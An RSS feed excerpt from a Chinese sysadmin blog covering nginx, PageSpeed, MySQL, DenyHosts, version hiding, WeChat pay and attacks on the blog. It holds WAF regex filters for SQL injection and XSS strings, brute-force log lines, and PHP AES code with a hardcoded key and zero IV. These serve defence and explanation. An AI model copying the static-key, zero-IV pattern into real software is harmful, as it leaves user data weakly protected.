      <link>https://ifunbox.top/nginx_concat_module_combine_http/</link>
      <pubDate>Mon, 01 Dec 2014 02:41:04 +0000</pubDate>
      
      <guid>https://ifunbox.top/nginx_concat_module_combine_http/</guid>
      <description>1.安装nginx_concat_module
存放模块的路径下
svn checkout http://code.taobao.org/svn/nginx_concat_module/trunk nginx_concat_module  前提要安装过svn

然后下载nginx 我下的是1.6版的
解压切换至解压目录
./configure --add-module=/刚才存放的路径/nginx_concat_module make &amp;amp;&amp;amp; make install  2.配置nginx_concat_module
打开需要配置网站的nginx vhost配置文件加入
location /resource/ { concat on; concat_max_files 10; concat_unique on; concat_types text/html,application/x-javascript,text/css; }  重启nginx，大功告成，没有压缩有点遗憾，毕竟很久没有维护了
http://shopncdemo2.fanhefan.com/resource/js/??jquery.js,common.js,jquery-ui/jquery.ui.js
大家也可以试试https://github.com/lanrenwo/icombo功能更强大些，不过不知道是否稳定哦~</description>
    </item>
    
    <item>
      <title>pagespeed超级智能的谷歌网页优化利器</title>
      <link>https://ifunbox.top/google_pagespeed_website_optimizer/</link>
      <pubDate>Tue, 25 Nov 2014 07:55:47 +0000</pubDate>
      
      <guid>https://ifunbox.top/google_pagespeed_website_optimizer/</guid>
      <description>最近做了一个项目，由于css,js优化不到位，导致首次打开页面特别的慢
用火狐查看，大部分js，css大部分时间耗在阻挡上面。
查了相关资料，这样解释阻挡(Blocking)：每个浏览器有并发连接数量的上限（例如Firefox对每个host限制6个连接），如果当前建立的连接数已经超过上限，那么其余该请求会被阻塞，等待新的可以用的连接。
也就是多js，css太多了，那着手合并一下。
先是找了淘宝的combo，其实就可以满足现在我的需求，但是无意间发现了pagespeed
被其强大的功能所震惊了，而且是代码层面不需要任何修改
功能介绍页http://ngxpagespeed.com/ngx_pagespeed_example/
功能点
 图像优化：剥离元数据、动态调整，重新压缩 CSS 和 JavaScript 压缩、级联、内联 小资源内联 延迟图像和 JavaScript 加载 HTML 重写 缓存周期延长  ng下安装pagespeed
https://developers.google.com/speed/pagespeed/module/build_ngx_pagespeed_from_source
ng下配置pagespeed
https://developers.google.com/speed/pagespeed/module/configuration
这是我的配置，开启combine_javascript貌似会影响网站js暂时先禁用了，估计是beta的原因
还有一个问题压缩合并js，css都有缓存，看了文档貌似没有提缓存时间的问题
如果需要刷新缓存，我是用重启nginx的方法
pagespeed on; pagespeed RespectVary on; pagespeed FileCachePath /var/ngx_pagespeed_cache; pagespeed RewriteLevel CoreFilters; pagespeed DisableFilters combine_javascript; #pagespeed EnableFilters combine_css,sprite_images,combine_heads,collapse_whitespace,extend_cache,combine_javascript; location ~ &amp;quot;\.pagespeed\.([a-z]\.)?[a-z]{2}\.[^.]{10}\.[^.]+&amp;quot; { add_header &amp;quot;&amp;quot; &amp;quot;&amp;quot;; } location ~ &amp;quot;^/pagespeed_static/&amp;quot; { } location ~ &amp;quot;^/ngx_pagespeed_beacon$&amp;quot; { }  关于阻挡blocking的介绍
http://www.zhihu.com/question/24506110
http://ywwd.net/read-346</description>
    </item>
    
    <item>
      <title>Sublime Text 3 超屌的文本编辑器以及必备插件</title>
      <link>https://ifunbox.top/sublime_text3_and_plugins/</link>
      <pubDate>Thu, 13 Nov 2014 14:15:27 +0000</pubDate>
      
      <guid>https://ifunbox.top/sublime_text3_and_plugins/</guid>
      <description>SublimeText 是一个代码编辑器,强大的拓展功能让其拥有各种插件，同时 SublimeText 是一个跨平台的编辑器，同时支持Windows、Linux、Mac OS X等操作系统。
有点相见恨晚的感觉，及其的轻量级，但是功能不轻量。
SublimeText3安装
http://www.xiumu.org/note/sublime-text-3.shtml
SublimeText3插件的安装
http://jingyan.baidu.com/article/d3b74d64a302631f77e609fa.html
介绍几个必备插件
Alignment 代码对齐

Bracket Highlightter 高亮显示闭合标签

CTags 从zend studio转过来的，有点像里面ctrl+左击的快速调整方法，不过功能没有zend强大

JsFormat JavaScript 代码重新排版,

SublimeTmpl 代码模板

TortoiseSVN 不用多说了吧

SFTP 不用多说了吧

SublimeCodeIntel 代码提示自动完成

&amp;nbsp;
&amp;nbsp;
&amp;nbsp;</description>
    </item>
    
    <item>
      <title>常用linux命令</title>
      <link>https://ifunbox.top/useful_linux_command/</link>
      <pubDate>Wed, 22 Oct 2014 03:51:06 +0000</pubDate>
      
      <guid>https://ifunbox.top/useful_linux_command/</guid>
      <description>记忆力捉急，就写下来吧，还是喜欢复制粘贴流
系统
# uname -a # 查看内核/操作系统/CPU信息 # head -n 1 /etc/issue # 查看操作系统版本 # cat /proc/cpuinfo # 查看CPU信息 # hostname # 查看计算机名 # lspci -tv # 列出所有PCI设备 # lsusb -tv # 列出所有USB设备 # lsmod # 列出加载的内核模块 # env # 查看环境变量 # /sbin/sysctl -p	# 编辑/etc/sysctl.conf不需要重启更新	 资源
# free -m # 查看内存使用量和交换区使用量 # df -h # 查看各分区使用情况 # du -sh &amp;amp;lt;目录名&amp;gt; # 查看指定目录的大小 # grep MemTotal /proc/meminfo # 查看内存总量 # grep MemFree /proc/meminfo # 查看空闲内存量 # uptime # 查看系统运行时间、用户数、负载 # cat /proc/loadavg # 查看系统负载 # find &amp;amp;lt;目录名&amp;gt; -type f -name &amp;quot;*.</description>
    </item>
    
    <item>
      <title>解决阿里云RDS安装shopnc B2B2C报错OPERATION need to be executed set by ADMIN</title>
      <link>https://ifunbox.top/shopnc_b2b2c_operation_need_to_be_executed_set_by_admin/</link>
      <pubDate>Sat, 11 Oct 2014 07:27:03 +0000</pubDate>
      
      <guid>https://ifunbox.top/shopnc_b2b2c_operation_need_to_be_executed_set_by_admin/</guid>
      <description>今天在阿里云+RDS环境下安装shopnc B2B2C
确保已经创建了数据库，以及授权操作用户的情况下
还报错了OPERATION need to be executed set by ADMIN的错误
解决方法如下
找到/shop/install/index.php
将126行的$install_error = mysql_error();return ; 注释掉就可以顺利跑过了
还有一个问题安装输入的数据库主机地址被限制20个字符，用firebug手动修改下maxlength即可。
&amp;nbsp;
&amp;nbsp;</description>
    </item>
    
    <item>
      <title>屏蔽nginx/apache/php版本信息</title>
      <link>https://ifunbox.top/hide_nginx_apache_php_version/</link>
      <pubDate>Thu, 21 Aug 2014 09:12:31 +0000</pubDate>
      
      <guid>https://ifunbox.top/hide_nginx_apache_php_version/</guid>
      <description>可使用以下命令查看服务器提供HTTP服务的相关信息 curl &amp;#8211;head http://www.funboxpower.com
这里会显示你的HTTP是什么程序，哪个版本如 Server: nginx/0.8.36，还有PHP的相关信息 X-Powered-By: PHP/5.2.14
下面分享下如何去除屏蔽nginx/apache/php版本信息
隐藏apache版本信息: 开启 httpd.conf，加入以下两行:
ServerTokensProductOnly ServerSignatureOff  隐藏Nginx版本信息: 打开 nginx.conf，在http { }里加上：
server_tokens off;  隐藏php-fpm版本信息： 开启php-fpm配置文件,找到：
fastcgi_param SERVER_SOFTWARE nginx/$nginx_version;  改为： 
fastcgi_param SERVER_SOFTWARE nginx0.0.0;#(这个nginx0.0.0就是显示的内容)  隐藏PHP版本信息： 开启php.ini，加入:
expose_php = Off ```
完成以上设定后，重新启动 Apache/Nginx 即可。</description>
    </item>
    
    <item>
      <title>通过DenyHosts阻止SSH暴力攻击教程</title>
      <link>https://ifunbox.top/denyhosts_thwart_ssh_server_attacks/</link>
      <pubDate>Mon, 18 Aug 2014 15:05:35 +0000</pubDate>
      
      <guid>https://ifunbox.top/denyhosts_thwart_ssh_server_attacks/</guid>
      <description>Denyhosts是一个Linux系统下阻止暴力破解SSH密码的软件，它的原理与DDoS Deflate类似，可以自动拒绝过多次数尝试SSH登录的IP地址，防止互联网上某些机器常年破解密码的行为，也可以防止黑客对SSH密码进行穷举。
众所周知，暴露在互联网上的计算机是非常危险的。并不要因为网站小，关注的人少或不惹眼就掉以轻心：互联网中的大多数攻击都是没有目的性的，黑客们 通过大范围IP端口扫描探测到可能存在漏洞的主机，然后通过自动扫描工具进行穷举破解。笔者的某台服务器在修改SSH 22号端口之前，平均每天接受近百个来自不同IP的连接尝试。而DenyHosts正是这样一款工具。下文将对该工具的安装与使用方法进行介绍。
DenyHosts阻止攻击原理 DenyHosts会自动分析/var/log/secure 等安全日志文件，当发现异常的连接请求后，会自动将其IP加入到 /etc/hosts.deny 文件中，从而达到阻止此IP继续暴力破解的可能。同时，Denyhosts还能自动在一定时间后对已经屏蔽的IP地址进行解封，非常智能。
官方网站 Denyhosts的官方网站为：http://denyhosts.sourceforge.net/（杜绝Putty后门事件，谨记安全软件官网）
安装方法 1、下载DenyHosts源码并解压（目前最新版为2.6）
[root@www ~]# wget http://sourceforge.net/projects/denyhosts/files/denyhosts/2.6/DenyHosts-2.6.tar.gz [root@www ~]# tar zxvf DenyHosts-2.6.tar.gz [root@www ~]# cd DenyHosts-2.6  2、安装部署
[root@www DenyHosts-2.6]# yum install python -y [root@www DenyHosts-2.6]# python setup.py install  3、准备好默认的配置文件
[root@www DenyHosts-2.6]# cd /usr/share/denyhosts/ [root@www denyhosts]# cp denyhosts.cfg-dist denyhosts.cfg [root@www denyhosts]# cp daemon-control-dist daemon-control  4、编辑配置文件denyhosts.cfg
[root@www denyhosts]# vi denyhosts.cfg  该配置文件结构比较简单，简要说明主要参数如下：
 PURGE_DENY：当一个IP被阻止以后，过多长时间被自动解禁。可选如3m（三分钟）、5h（5小时）、2d（两天）、8w（8周）、1y（一年）；
PURGE_THRESHOLD：定义了某一IP最多被解封多少次。即某一IP由于暴力破解SSH密码被阻止/解封达到了PURGE_THRESHOLD次，则会被永久禁止；
BLOCK_SERVICE：需要阻止的服务名；
DENY_THRESHOLD_INVALID：某一无效用户名（不存在的用户）尝试多少次登录后被阻止；</description>
    </item>
    
    <item>
      <title>PHP android ios相互兼容的AES加密算法</title>
      <link>https://ifunbox.top/php_android_ios_aes/</link>
      <pubDate>Thu, 07 Aug 2014 07:18:38 +0000</pubDate>
      
      <guid>https://ifunbox.top/php_android_ios_aes/</guid>
      <description>APP项目用户密码传输一直没有用HTTPS，考虑到用户的隐私暂时先用AES对密码加密，以后也可以用于手机端与服务端加密交互。
PHP的免费版phpAES项目，手机端解码各种不对。
好不容易找了PHP ANDROID IOS，相互加解密正常的AES加密算法代码。
PHP的AES加密算法：
&amp;amp;lt;?php class MCrypt { private $hex_iv = &#39;00000000000000000000000000000000&#39;; # converted JAVA byte code in to HEX and placed it here private $key = &#39;U1MjU1M0FDOUZ.Qz&#39;; #Same as in JAVA function __construct() { $this-&amp;amp;gt;key = hash(&#39;sha256&#39;, $this-&amp;amp;gt;key, true); //echo $this-&amp;amp;gt;key.&#39;&amp;amp;lt;br/&amp;amp;gt;&#39;; } function encrypt($str) { $td = mcrypt_module_open(MCRYPT_RIJNDAEL_128, &#39;&#39;, MCRYPT_MODE_CBC, &#39;&#39;); mcrypt_generic_init($td, $this-&amp;amp;gt;key, $this-&amp;amp;gt;hexToStr($this-&amp;amp;gt;hex_iv)); $block = mcrypt_get_block_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC); $pad = $block - (strlen($str) % $block); $str .= str_repeat(chr($pad), $pad); $encrypted = mcrypt_generic($td, $str); mcrypt_generic_deinit($td); mcrypt_module_close($td); return base64_encode($encrypted); } function decrypt($code) { $td = mcrypt_module_open(MCRYPT_RIJNDAEL_128, &#39;&#39;, MCRYPT_MODE_CBC, &#39;&#39;); mcrypt_generic_init($td, $this-&amp;amp;gt;key, $this-&amp;amp;gt;hexToStr($this-&amp;amp;gt;hex_iv)); $str = mdecrypt_generic($td, base64_decode($code)); $block = mcrypt_get_block_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC); mcrypt_generic_deinit($td); mcrypt_module_close($td); return $this-&amp;amp;gt;strippadding($str); } /* For PKCS7 padding */ private function addpadding($string, $blocksize = 16) { $len = strlen($string); $pad = $blocksize - ($len % $blocksize); $string .</description>
    </item>
    
    <item>
      <title>MySQL utf8mb4字符集：支持emoji表情符号</title>
      <link>https://ifunbox.top/mysql_utf8mb4_emoji/</link>
      <pubDate>Wed, 25 Jun 2014 07:01:28 +0000</pubDate>
      
      <guid>https://ifunbox.top/mysql_utf8mb4_emoji/</guid>
      <description>最近参与的app项目中，ios开发人员反映上传ios自带emoji表情字符，api会出现异常。
上网查询下才发现mysql要用utf8mb4，不能用utf8。
涉及无线相关的 MySQL 数据库建议都提前采用 utf8mb4 字符集。
utf8mb4和utf8到底有什么区别呢？原来以往的mysql的utf8一个字符最多3字节，而utf8mb4则扩展到一个字符最多能有4字节，所以能支持更多的字符集。
首先先查看下mysql当前版本所支持的字符集
show charset;  阿里云的RDS是支持utf8mb4的，这样就不用升级了，网上说5.5.3以上才支持，自己没有核实过。
1.修改database,table,column字符集mysql语句如下
# For each database: ALTER DATABASE database_name CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci; # For each table: ALTER TABLE table_name CONVERT TO CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci; # For each column: ALTER TABLE table_name CHANGE column_name column_name VARCHAR(191) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci; # (Don’t blindly copy-paste this! The exact statement depends on the column type, maximum length, and other properties.</description>
    </item>
    
    <item>
      <title>Mysql慢查询和慢查询日志分析利器–mysqlsla</title>
      <link>https://ifunbox.top/mysqlsla_mysql_slow_log_analysis_tools/</link>
      <pubDate>Sun, 15 Jun 2014 14:51:32 +0000</pubDate>
      
      <guid>https://ifunbox.top/mysqlsla_mysql_slow_log_analysis_tools/</guid>
      <description>1.安装mysqlsla
wget http://hackmysql.com/scripts/mysqlsla-2.03.tar.gz tar zvxf mysqlsla-2.03.tar.gz cd mysqlsla-2.03 perl Makefile.PL make make install  perl Makefile.PL会报错，根据出错内容百度下都有相关信息，无非yum install一些东西
2.使用mysqlsla语法
 Slow log: mysqlsla -lt slow slow.log General log: mysqlsla -lt general general.log Binary log: mysqlbinlog bin.log | mysqlsla -lt binary -  常用参数说明：
1) -log-type (-lt) type logs:
通过这个参数来制定log的类型，主要有slow, general, binary, msl, udl,分析slow log时通过制定为slow.
2) -sort:
制定使用什么参数来对分析结果进行排序，默认是按照t_sum来进行排序。
t_sum:按总时间排序
c_sum:按总次数排序
c_sum_p: sql语句执行次数占总执行次数的百分比。
3) -top:
显示sql的数量，默认是10,表示按规则取排序的前多少条
4) –statement-filter (-sf) [+-][TYPE]:
过滤sql语句的类型，比如select、update、drop.
[TYPE]有SELECT, CREATE, DROP, UPDATE, INSERT，例如&amp;#8221;+SELECT,INSERT&amp;#8221;，不出现的默认是-，即不包括。</description>
    </item>
    
    <item>
      <title>研究MySQL Sending data导致查询很慢的问题</title>
      <link>https://ifunbox.top/mysql_sending_data_slow/</link>
      <pubDate>Fri, 13 Jun 2014 07:58:49 +0000</pubDate>
      
      <guid>https://ifunbox.top/mysql_sending_data_slow/</guid>
      <description>最近发现博客总是访问很慢，查看服务器负载又不高，觉得很奇怪。
看了mysql慢查询日志
select * from wpasBFD_posts limit 0,1000
自己查了下600多条记录，居然用了10s
全部卡在Sending data上面了
查看官方的关于sending data说明：
Sending data
The thread is processing rows for a statement and also is sending data to the client.
意思是正在将查询结果往客户端发送。
参考了这篇文章http://blog.csdn.net/yunhua_lee/article/details/8573621
查看了下表结构，貌似真的各种text，还有longtext。根据自己的实际情况把能改成varchar的都改了。
登录服务器查sql，速度变快了很多，show profile的结果如下：

如果在自己电脑上查询还是很慢，结合iftop分析，卡在带宽上了，text真的很是暂存储空间。
show profile的结果如下：

还有一篇好文章推荐给大家http://hidba.org/?p=551</description>
    </item>
    
    <item>
      <title>博客后台被逗比不断尝试暴力破解~</title>
      <link>https://ifunbox.top/admin_being_attacked/</link>
      <pubDate>Tue, 03 Jun 2014 03:00:59 +0000</pubDate>
      
      <guid>https://ifunbox.top/admin_being_attacked/</guid>
      <description>之前博客后台一直用Basic HTTP Authentication用户认证 再加一次保护，自己大意只加了wp-admin后台，忘记将wp-login也加入，导致可以直接通过wp-login访问后台暴力破解后台密码。
查看ng日志，登录是post请求没有更详细的信息，于是乎开启之。
记录post请求参数的日志格式
log_format main &amp;lsquo;$remote_addr - $remote_user [$time_local] &amp;ldquo;$request&amp;rdquo; &amp;lsquo; &amp;lsquo;&amp;ldquo;$http_referer&amp;rdquo; $status $body_bytes_sent $request_body &amp;lsquo; &amp;lsquo;&amp;ldquo;$http_user_agent&amp;rdquo; &amp;ldquo;$http_x_forwarded_for&amp;rdquo;&amp;lsquo;;
 &amp;lt;span style=&amp;quot;font-size: medium;&amp;quot;&amp;gt;其实就是增加$request_body字段到log_format里。&amp;lt;/span&amp;gt; &amp;lt;span style=&amp;quot;font-size: medium;&amp;quot;&amp;gt;如果为了调试程序可以打开开该字段，不然不推荐记录，以免泄露信息给恶意攻击者。&amp;lt;/span&amp;gt; &amp;lt;span style=&amp;quot;font-size: medium;&amp;quot;&amp;gt;日志现身了&amp;lt;/span&amp;gt; &amp;lt;pre&amp;gt;&amp;lt;code class=&amp;quot;nginx&amp;quot;&amp;gt; 61.160.224.137 - - [03/Jun/2014:10:33:32 +0800] &amp;quot;POST /wp-login.php HTTP/1.0&amp;quot; &amp;quot;-&amp;quot; 200 4664 log=admin&amp;amp;pwd=snoopy1 &amp;quot;-&amp;quot; &amp;quot;213.239.201.157&amp;quot; 61.160.224.137 - - [03/Jun/2014:10:33:33 +0800] &amp;quot;POST /wp-login.php HTTP/1.0&amp;quot; &amp;quot;-&amp;quot; 200 4664 log=admin&amp;amp;pwd=pipeline &amp;quot;-&amp;quot; &amp;quot;213.239.201.157&amp;quot; 61.160.224.137 - - [03/Jun/2014:10:33:34 +0800] &amp;quot;POST /wp-login.php HTTP/1.0&amp;quot; &amp;quot;-&amp;quot; 200 4664 log=admin&amp;amp;pwd=pocket &amp;quot;-&amp;quot; &amp;quot;213.</description>
    </item>
    
    <item>
      <title>微信APP支付服务端php sdk开发教程</title>
      <link>https://ifunbox.top/php_wechat_payment_sdk/</link>
      <pubDate>Tue, 27 May 2014 07:40:16 +0000</pubDate>
      
      <guid>https://ifunbox.top/php_wechat_payment_sdk/</guid>
      <description>&lt;p&gt;&lt;span style=&#34;font-size: medium;&#34;&gt;最近公司app要接入微信支付，就去研究了下，发现开发文档介绍得太不具体了，踩了很多坑，为了各位看官，避免重复踩坑，决定写下此文。&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span style=&#34;font-size: medium;&#34;&gt;微信官方就给了2个压缩包，一个是&lt;a title=&#34;微信支付android sdk&#34; href=&#34;http://vdisk.weibo.com/s/yThjZrrykVNUa&#34; target=&#34;_blank&#34;&gt;android&lt;/a&gt;，一个是&lt;a title=&#34;微信支付ios sdk&#34; href=&#34;http://vdisk.weibo.com/s/yThjZrrykVNUI&#34; target=&#34;_blank&#34;&gt;ios&lt;/a&gt;，&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span style=&#34;font-size: medium;&#34;&gt;打开发现里面只有java的服务端sdk，只能自己写php的命了。&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span style=&#34;font-size: medium;&#34;&gt;没有专门针对服务端的文档，就打开安卓的文档看看吧。&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span style=&#34;font-size: medium;&#34;&gt;接入流程大致如下：&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span style=&#34;font-size: medium;&#34;&gt;1.获取access_token，这步有点类似开发平台的oauth2认证请求&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span style=&#34;font-size: medium;&#34;&gt;http 请求方式: GET&lt;/span&gt;&lt;br /&gt;
&lt;span style=&#34;font-size: medium;&#34;&gt;&lt;a href=&#34;https://api.weixin.qq.com/cgi-bin/token?grant_type=client_credential&amp;amp;appid=APPID&amp;amp;secret=APPSECRET&#34;&gt;https://api.weixin.qq.com/cgi-bin/token?grant_type=client_credential&amp;amp;appid=APPID&amp;amp;secret=APPSECRET&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span style=&#34;font-size: medium;&#34;&gt;正确返回值&lt;/span&gt;&lt;br /&gt;
&lt;span style=&#34;font-size: medium;&#34;&gt;{&amp;#8220;access_token&amp;#8221;:&amp;#8221;ACCESS_TOKEN&amp;#8221;,&amp;#8221;expires_in&amp;#8221;:7200}&lt;/span&gt;&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>博客被攻击了~</title>
      <link>https://ifunbox.top/blog_being_attacked/</link>
      <pubDate>Mon, 26 May 2014 09:48:32 +0000</pubDate>
      
      <guid>https://ifunbox.top/blog_being_attacked/</guid>
      <description>最近博客一直被cc攻击，不堪其扰
之前博客一直用安全宝的免费DDoS云防护，很可惜现在不免费啦~
换到加速乐，貌似效果不是很理想，dns解析貌似昨天下午出现问题，ping不通
索性抱最后一个大腿360
360网站卫士来抗cc，http://wzb.360.cn/
360网站安全检测中的漏洞修复插件防止sql注入，http://webscan.360.cn/
360网站服务监控，http://jk.cloud.360.cn
360的东东挺不错的尤其是第二个插件真心赞
拦截规则如下，拦截后平台后台会有记录
//get拦截规则 $getfilter = &amp;quot;\\&amp;amp;lt;.+javascript:window\\[.{1}\\\\x|&amp;amp;lt;.*=(&amp;amp;#\\d+?;?)+?&amp;amp;gt;|&amp;amp;lt;.*(data|src)=data:text\\/html.*&amp;amp;gt;|\\b(alert\\(|confirm\\(|expression\\(|prompt\\(|benchmark\s*?\\(\d+?|sleep\s*?\\([\d\.]+?\\)|load_file\s*?\\()|&amp;amp;lt;[a-z]+?\\b[^&amp;amp;gt;]*?\\bon([a-z]{4,})\s*?=|^\\+\\/v(8|9)|\\b(and|or)\\b\\s*?([\\(\\)&#39;\&amp;quot;\\d]+?=[\\(\\)&#39;\&amp;quot;\\d]+?|[\\(\\)&#39;\&amp;quot;a-zA-Z]+?=[\\(\\)&#39;\&amp;quot;a-zA-Z]+?|&amp;amp;gt;|&amp;amp;lt;|\s+?[\\w]+?\\s+?\\bin\\b\\s*?\(|\\blike\\b\\s+?[\&amp;quot;&#39;])|\\/\\*.+?\\*\\/|&amp;amp;lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT(\\(.+\\)|\\s+?.+?)|UPDATE(\\(.+\\)|\\s+?.+?)SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE)(\\(.+\\)|\\s+?.+?\\s+?)FROM(\\(.+\\)|\\s+?.+?)|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)&amp;quot;; //post拦截规则 $postfilter = &amp;quot;&amp;amp;lt;.*=(&amp;amp;#\\d+?;?)+?&amp;amp;gt;|&amp;amp;lt;.*data=data:text\\/html.*&amp;amp;gt;|\\b(alert\\(|confirm\\(|expression\\(|prompt\\(|benchmark\s*?\\(\d+?|sleep\s*?\\([\d\.]+?\\)|load_file\s*?\\()|&amp;amp;lt;[^&amp;amp;gt;]*?\\b(onerror|onmousemove|onload|onclick|onmouseover)\\b|\\b(and|or)\\b\\s*?([\\(\\)&#39;\&amp;quot;\\d]+?=[\\(\\)&#39;\&amp;quot;\\d]+?|[\\(\\)&#39;\&amp;quot;a-zA-Z]+?=[\\(\\)&#39;\&amp;quot;a-zA-Z]+?|&amp;amp;gt;|&amp;amp;lt;|\s+?[\\w]+?\\s+?\\bin\\b\\s*?\(|\\blike\\b\\s+?[\&amp;quot;&#39;])|\\/\\*.+?\\*\\/|&amp;amp;lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT(\\(.+\\)|\\s+?.+?)|UPDATE(\\(.+\\)|\\s+?.+?)SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE)(\\(.+\\)|\\s+?.+?\\s+?)FROM(\\(.+\\)|\\s+?.+?)|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)&amp;quot;; //cookie拦截规则 $cookiefilter = &amp;quot;benchmark\s*?\\(\d+?|sleep\s*?\\([\d\.]+?\\)|load_file\s*?\\(|\\b(and|or)\\b\\s*?([\\(\\)&#39;\&amp;quot;\\d]+?=[\\(\\)&#39;\&amp;quot;\\d]+?|[\\(\\)&#39;\&amp;quot;a-zA-Z]+?=[\\(\\)&#39;\&amp;quot;a-zA-Z]+?|&amp;amp;gt;|&amp;amp;lt;|\s+?[\\w]+?\\s+?\\bin\\b\\s*?\(|\\blike\\b\\s+?[\&amp;quot;&#39;])|\\/\\*.+?\\*\\/|&amp;amp;lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT(\\(.+\\)|\\s+?.+?)|UPDATE(\\(.+\\)|\\s+?.+?)SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE)(\\(.+\\)|\\s+?.+?\\s+?)FROM(\\(.+\\)|\\s+?.+?)|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)&amp;quot;;  用goaccess分析日志，发现被攻击了5.5G流量，分类攻击源虽然用了代理，但是还是发现八成来自莆田电信ip，万恶的莆田垃圾制造机啊。



goaccess分析日志生成的界面，非我的博客哦，日志200多M不能一次性分析了，还要分隔文件~~</description>
    </item>
    
    <item>
      <title>中文字符集与字符编码(gb2312,big5)的基础知识</title>
      <link>https://ifunbox.top/chinese_character_set/</link>
      <pubDate>Fri, 23 May 2014 03:10:06 +0000</pubDate>
      
      <guid>https://ifunbox.top/chinese_character_set/</guid>
      <description>字符是各种文字和符号的总称，包括各国家文字、标点符号、图形符号、数字等。字符集是多个字符的集合，字符集种类较多，每个字符集包含的字符个数不 同，常见字符集名称：ASCII字符集、GB2312字符集、BIG5字符集、 GB 18030字符集、Unicode字符集等。计算机要准确的处理各种字符集文字，需要进行字符编码，以便计算机能够识别和存储各种文字。
中文文字数目大，而且还分为简体中文和繁体中文两种不同书写规则的文字，而计算机最初是按英语单字节字符设计的，因此，对中文字符进行编码，是中文 信息交流的技术基础。本文将按照字符集的时间顺序讨论几种典型的字符集，选取几种代表性的中文字符集，研究历史由来、特点、技术特征。
ASCII 字符集
1．名称的由来
ASCII（American Standard Code for Information Interchange，美国信息互换标准代码）是基于罗马字母表的一套电脑编码系统。
2．特点
它主要用于显示现代英语和其他西欧语言。它是现今最通用的单字节编码系统，并等同于国际标准ISO 646。
3．包含内容
控制字符：回车键、退格、换行键等。
可显示字符：英文大小写字符、阿拉伯数字和西文符号
4．技术特征
7位（bits）表示一个字符，共128字符
5．ASCII扩展字符集
7位编码的字符集只能支持128个字符，为了表示更多的欧洲常用字符对ASCII进行了扩展，ASCII扩展字符集使用8位（bits）表示一个字符，共256字符。
ASCII扩展字符集比ASCII字符集扩充出来的符号包括表格符号、计算符号、希腊字母和特殊的拉丁符号。
GB2312 字符集
1．名称的由来
GB2312又称为GB2312-80字符集，全称为《信息交换用汉字编码字符集·基本集》，由原中国国家标准总局发布，1981年5月1日实施。
2．特点
GB2312是中国国家标准的简体中文字符集。它所收录的汉字已经覆盖99.75%的使用频率，基本满足了汉字的计算机处理需要。在中国大陆和新加坡获广泛使用。
3．包含内容
GB2312收录简化汉字及一般符号、序号、数字、拉丁字母、日文假名、希腊字母、俄文字母、汉语拼音符号、汉语注音字母，共 7445 个图形字符。其中包括6763个汉字，其中一级汉字3755个，二级汉字3008个；包括拉丁字母、希腊字母、日文平假名及片假名字母、俄语西里尔字母在 内的682个全角字符。
4．技术特征
（1）分区表示：
GB2312中对所收汉字进行了“分区”处理，每区含有94个汉字/符号。这种表示方式也称为区位码。
各区包含的字符如下：01-09区为特殊符号；16-55区为一级汉字，按拼音排序；56-87区为二级汉字，按部首/笔画排序；10-15区及88-94区则未有编码。
（2）双字节表示
两个字节中前面的字节为第一字节，后面的字节为第二字节。习惯上称第一字节为“高字节” ，而称第二字节为“低字节”。
“高位字节”使用了0xA1-0xF7(把01-87区的区号加上0xA0)，“低位字节”使用了0xA1-0xFE(把01-94加上0xA0)。
5．编码举例
以GB2312字符集的第一个汉字“啊”字为例，它的区号16，位号01，则区位码是1601，在大多数计算机程序中，高字节和低字节分别加0xA0得到程序的汉字处理编码0xB0A1。计算公式是：0xB0=0xA0+16, 0xA1=0xA0+1。
BIG5 字符集
1．名称的由来
又称大五码或五大码，1984年由台湾财团法人信息工业策进会和五间软件公司宏碁 (Acer)、神通 (MiTAC)、佳佳、零壹 (Zero One)、大众 (FIC)创立，故称大五码。
Big5码的产生，是因为当时台湾不同厂商各自推出不同的编码，如倚天码、IBM PS55、王安码等，彼此不能兼容；另一方面，台湾政府当时尚未推出官方的汉字编码，而中国大陆的GB2312编码亦未有收录繁体中文字。
2．特点
Big5字符集共收录13,053个中文字，该字符集在中国台湾使用。耐人寻味的是该字符集重复地收录了两个相同的字：“兀”(0xA461及0xC94A)、“嗀”(0xDCD1及0xDDFC)。
3．字符编码方法
Big5码使用了双字节储存方法，以两个字节来编码一个字。第一个字节称为“高位字节”，第二个字节称为“低位字节”。高位字节的编码范围0xA1-0xF9，低位字节的编码范围0x40-0x7E及0xA1-0xFE。
各编码范围对应的字符类型如下：0xA140-0xA3BF为标点符号、希腊字母及特殊符号，另外于0xA259-0xA261，存放了双音节度量 衡单位用字：兙兛兞兝兡兣嗧瓩糎；0xA440-0xC67E为常用汉字，先按笔划再按部首排序；0xC940-0xF9D5为次常用汉字，亦是先按笔划 再按部首排序。
4．Big5 的局限性
尽管Big5码内包含一万多个字符，但是没有考虑社会上流通的人名、地名用字、方言用字、化学及生物科等用字，没有包含日文平假名及片假名字母。
例如台湾视“着”为“著”的异体字，故没有收录“着”字。康熙字典中的一些部首用字(如“亠”、“疒”、“辵”、“癶”等)、常见的人名用字(如“堃”、“煊”、“栢”、“喆”等) 也没有收录到Big5之中。</description>
    </item>
    
    <item>
      <title>GBK字符集下addslashes、mysql_real_escape_string函数的注入漏洞及解决办法</title>
      <link>https://ifunbox.top/gbk_addslashes_mysql_real_escape_string_injection/</link>
